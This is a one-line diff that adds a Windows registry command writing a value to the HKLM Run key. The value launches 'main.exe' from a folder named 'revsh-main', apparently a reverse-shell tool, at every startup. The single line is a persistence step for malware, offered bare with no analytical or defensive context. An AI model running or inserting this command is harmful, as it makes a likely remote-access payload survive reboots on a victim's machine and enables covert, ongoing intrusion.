@@ -1,0 +1,1 @@
+REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /V main /D "C:\Users\migue\revsh-main\main.exe" /F
